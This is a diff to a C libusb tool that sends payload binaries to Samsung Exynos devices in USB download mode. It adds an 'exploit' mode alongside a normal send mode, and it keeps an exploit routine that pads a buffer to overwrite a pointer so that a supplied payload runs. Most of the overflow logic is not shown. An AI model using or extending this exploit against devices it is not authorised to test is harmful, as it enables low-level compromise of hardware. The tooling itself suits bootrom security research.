@@ -6,9 +6,10 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
+#include <assert.h>
 #include "libusb-1.0/libusb.h"
 
-#define DEBUG	1
+#define DEBUG	0
 #define VENDOR_ID	0x04e8
 #define PRODUCT_ID	0x1234
 #define BLOCK_SIZE		512
@@ -19,6 +20,11 @@
 #else
 #define dprint(args...)
 #endif
+
+enum {
+	NORMAL_MODE = 0,
+	EXPLOIT_MODE,
+};
 
 static char *target_names[] = {
 	"Exynos8890",//TARGET_8890
@@ -40,9 +46,30 @@ libusb_device_handle *handle = NULL;
 typedef struct __attribute__ ((__packed__)) dldata_s {
 	u_int32_t unk0;
 	u_int32_t size;// header(8) + data(n) + footer(2)
-	u_int8_t data[MAX_PAYLOAD_SIZE];
-	u_int16_t unk1;
+	u_int8_t data[];
+	//u_int16_t footer;
 } dldata_t;
+
+static int send(dldata_t *payload) {
+	int rc;
+	int transferred;
+	uint total_size = payload->size;
+	uint8_t *payload_ptr = (uint8_t *)payload;
+
+	do {
+		rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, payload_ptr, (total_size < BLOCK_SIZE ? total_size : BLOCK_SIZE), &transferred, 0);
+		if(rc) {
+			fprintf(stderr, "Error libusb_bulk_transfer: %s\n", libusb_error_name(rc));
+			return rc;
+		}
+		dprint("libusb_bulk_transfer: transferred=%d\n", transferred);
+		payload_ptr += transferred;
+		assert(total_size>=transferred);
+		total_size -= transferred;
+	} while(total_size > 0);
+
+	return rc;
+}
 
 static int exploit(dldata_t *payload, int target_id) {
 	int rc;
@@ -86,7 +113,7 @@ static int exploit(dldata_t *payload, int target_id) {
 		padding_size = BLOCK_SIZE;//TODO hmmm no!
 		dprint("new padding_size = 0x%x\n", padding_size);
 	}
-	uint32_t ram_size = padding_size + sizeof(targets[target_id][XFER_BUFFER]) + sizeof(payload->unk1);//the pointer we overwrite is at the end, and we need to 2 extra bytes for footer
+	uint32_t ram_size = padding_size + sizeof(targets[target_id][XFER_BUFFER]) + 2;//the pointer we overwrite is at the end, and we need to 2 extra bytes for footer
 	dprint("ram_size = 0x%x\n", ram_size);
 
 	// step 2 : prepare payload
@@ -178,7 +205,7 @@ static int identify_target()
 
 	rc = libusb_get_device_descriptor(libusb_get_device(handle), &desc);
 	if (LIBUSB_SUCCESS != rc) {
-		fprintf (stderr, "Error getting device descriptor\n");
+		fprintf(stderr, "Error getting device descriptor\n");
 		return -1;
 	}
 
@@ -202,66 +229,84 @@ static int identify_target()
 static int save_received_data(const char *filename){
 	FILE *fd;
 	int transferred = 0;
+	int total_transferred = 0;
 	uint8_t buf[BLOCK_SIZE];
 
 	fd = fopen(filename,"wb");
 	if (fd == NULL) {
-		perror("Can't open output file!\n");
+		fprintf(stderr, "Error: Can't open output file!\n");
 		return -1;
 	}
 
 	do {
 		libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_IN | 1, buf, sizeof(buf), &transferred, 10);// no error handling because device-side is a mess anyway
 		fwrite(buf, 1, transferred, fd);
+		total_transferred += transferred;
 	} while(transferred);
 
 	fclose(fd);
 
-	return 0;
+	return total_transferred;
 }
 
 int main(int argc, char *argv[])
 {
 	libusb_context *ctx;
 	FILE *fd;
-	dldata_t payload = {0};
-	size_t result, fd_size;
+	dldata_t *payload;
+	size_t payload_size, fd_size;
 	int target_id = -1;
+	uint8_t mode;
 	int rc;
 
-	if (!(argc == 2 || argc == 3)) {
-		printf("Usage: %s <input_file> [<output_file>]\n", argv[0]);
+	if (!(argc == 3 || argc == 4)) {
+		printf("Usage: %s <mode> <input_file> [<output_file>]\n", argv[0]);
+		printf("\tmode: mode of operation\n");
+		printf("\t\tn: normal\n");
+		printf("\t\te: exploit\n");
 		printf("\tinput_file: payload binary to load and execute\n");
-		printf("\toutput_file: file to write data returned by payload\n");
-		exit(-1);
+		printf("\toutput_file: file to write data returned by payload (exploit mode only)\n");
+		return EXIT_SUCCESS;
 	}
 
-	fd = fopen(argv[1],"rb");
+	if(argv[1] && argv[1][0] == 'e')
+		mode = EXPLOIT_MODE;
+	else
+		mode = NORMAL_MODE;
+
+	fd = fopen(argv[2],"rb");
 	if (fd == NULL) {
-		perror("Can't open input file !\n");
-		exit(-1);
+		fprintf(stderr, "Can't open input file %s !\n", argv[2]);
+		return EXIT_FAILURE;
 	}
 
 	fseek(fd, 0, SEEK_END);
 	fd_size = ftell(fd);
-	if(fd_size > MAX_PAYLOAD_SIZE){
-		printf("Error: input file size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
-		exit(-1);
+
+	if(mode == EXPLOIT_MODE){
+		if(fd_size > MAX_PAYLOAD_SIZE){
+			fprintf(stderr, "Error: input payload size cannot exceed %u bytes !\n", MAX_PAYLOAD_SIZE);
+			return EXIT_FAILURE;
+		}
+		payload_size = sizeof(dldata_t) + MAX_PAYLOAD_SIZE + 2;// +2 bytes for footer
+	}else{// NORMAL_MODE
+		payload_size = sizeof(dldata_t) + fd_size + 2;// +2 bytes for footer
 	}
 
-	payload.size = sizeof(dldata_t);
+	payload = (dldata_t*)calloc(1, payload_size);
+	payload->size = payload_size;
 
 	fseek(fd, 0, SEEK_SET);
-	result = fread(&payload.data, 1, fd_size, fd);
-	if (result != fd_size) {
-		printf("Error: cannot read entire file !\n");
-		exit(-1);
+	payload_size = fread(&payload->data, 1, fd_size, fd);
+	if (payload_size != fd_size) {
+		fprintf(stderr, "Error: cannot read entire file !\n");
+		return EXIT_FAILURE;
 	}
 
 	rc = libusb_init (&ctx);
 	if (rc < 0)
 	{
-		printf("failed to initialise libusb: %s\n", libusb_error_name(rc));
+		fprintf(stderr, "Error: failed to initialise libusb: %s\n", libusb_error_name(rc));
 		return EXIT_FAILURE;
 	}
 
@@ -271,24 +316,33 @@ int main(int argc, char *argv[])
 
 	handle = libusb_open_device_with_vid_pid(NULL, VENDOR_ID, PRODUCT_ID);
 	if (!handle) {
-		fprintf (stderr, "Error cannot open device %04x:%04x\n", VENDOR_ID, PRODUCT_ID);
+		fprintf(stderr, "Error: cannot open device %04x:%04x\n", VENDOR_ID, PRODUCT_ID);
 		libusb_exit (NULL);
 		return EXIT_FAILURE;
 	}
 
-	target_id = identify_target();
-
 	rc = libusb_claim_interface(handle, 0);
 	if(rc) {
 		fprintf(stderr, "Error claiming interface: %s\n", libusb_error_name(rc));
-		return rc;
+		return EXIT_FAILURE;
 	}
 
-	exploit(&payload, target_id);
+	if(mode == EXPLOIT_MODE){
+		target_id = identify_target();
+		exploit(payload, target_id);
 
-	if(argv[2])
-		save_received_data(argv[2]);
-
+		if(argv[3]){
+			rc = save_received_data(argv[3]);
+			if(rc > 0){
+				printf("Received data saved to file %s (%u bytes).\n", argv[3], rc);
+			}
+		}
+	}else{// NORMAL_MODE
+		printf("Sending file %s (0x%lx)...\n", argv[2], fd_size);
+		rc = send(payload);
+		if(!rc)
+			printf("File %s sent !\n", argv[2]);
+	}
 	#if DEBUG
 	sleep(5);
 	#endif
